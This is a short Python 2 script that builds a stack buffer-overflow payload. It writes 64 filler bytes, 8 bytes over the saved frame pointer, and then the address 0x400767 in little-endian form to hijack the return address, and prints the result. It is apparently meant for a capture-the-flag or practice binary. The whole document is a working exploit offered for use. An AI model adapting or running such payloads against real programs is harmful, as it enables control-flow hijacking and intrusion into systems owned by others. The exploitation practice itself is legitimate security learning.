import struct

padd = 'A'*64
padd += 'B'*8
#padd += struct.pack('Q', 0x0000000000400767)
padd += '\x67\x07\x40\x00\x00\x00\x00\x00'
print str(padd)